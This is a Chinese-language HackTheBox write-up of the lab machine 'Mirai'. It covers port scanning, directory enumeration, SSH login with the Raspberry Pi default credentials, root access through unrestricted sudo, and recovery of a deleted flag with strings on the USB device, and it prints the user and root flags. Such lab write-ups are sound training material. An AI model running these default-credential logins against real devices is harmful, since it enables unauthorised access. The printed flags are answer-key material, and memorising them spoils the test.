###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Mirai
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.37.77 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.37.77:22
Open 10.129.37.77:53
Open 10.129.37.77:80
Open 10.129.37.77:1921
Open 10.129.37.77:32400
Open 10.129.37.77:32469

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp    open  domain  syn-ack dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    syn-ack lighttpd 1.4.35
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1921/tcp  open  upnp    syn-ack Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    syn-ack Plex Media Server httpd
|_http-title: Unauthorized
|_http-cors: HEAD GET POST PUT DELETE
|_http-favicon: Plex
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
32469/tcp open  upnp    syn-ack Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

掃目錄
```
┌──(kali㉿kali)-[~/htb]
└─$ feroxbuster -u http://10.129.37.77/ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

200      GET        1l        1w       18c http://10.129.37.77/versions                                                           
200      GET      145l     2311w    14164c http://10.129.37.77/admin/LICENSE                                                      
200      GET       20l      170w     1085c http://10.129.37.77/admin/scripts/vendor/LICENSE                                       
200      GET       20l      170w     1085c http://10.129.37.77/admin/style/vendor/LICENSE                                         [####################] - 15m   613550/613550  0s      found:4       errors:9893   
[####################] - 14m    87650/87650   104/s   http://10.129.37.77/ 
[####################] - 14m    87650/87650   102/s   http://10.129.37.77/admin/ 
[####################] - 14m    87650/87650   103/s   http://10.129.37.77/admin/img/ 
[####################] - 14m    87650/87650   103/s   http://10.129.37.77/admin/scripts/ 
[####################] - 14m    87650/87650   103/s   http://10.129.37.77/admin/style/ 
[####################] - 14m    87650/87650   104/s   http://10.129.37.77/admin/scripts/vendor/ 
[####################] - 14m    87650/87650   104/s   http://10.129.37.77/admin/style/vendor/
```

搜尋`pi-hole version v3.1.4 default password`

![Mirai_1.png](picture/Mirai_1.png)

他說是`pi/raspberry`，可直接用ssh登入，在`/home/pi/Desktop`可得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh pi@10.129.37.77 

pi@10.129.37.77's password: raspberry

pi@raspberrypi:~/Desktop $ cat user.txt
ff837707441b257a20e32199d7c8838d
```

查看`sudo -l`，可直接切成root，但他說root.txt在USB裡面
```
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

pi@raspberrypi:~/Desktop $ sudo su
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

查看`mount`的點，前往`/media/usbstick`之後發現`damnit.txt`說啥刪掉了
```
root@raspberrypi:~# cat /etc/fstab
# UNCONFIGURED FSTAB FOR BASE SYSTEM
aufs / aufs rw 0 0
tmpfs /tmp tmpfs nosuid,nodev 0 0
/dev/sdb /media/usbstick ext4 ro,suid,dev,noexec,auto,user,async 0 0

root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

使用`sudo strings /dev/sdb`可以直接看到flag
```
root@raspberrypi:/media/usbstick# sudo strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```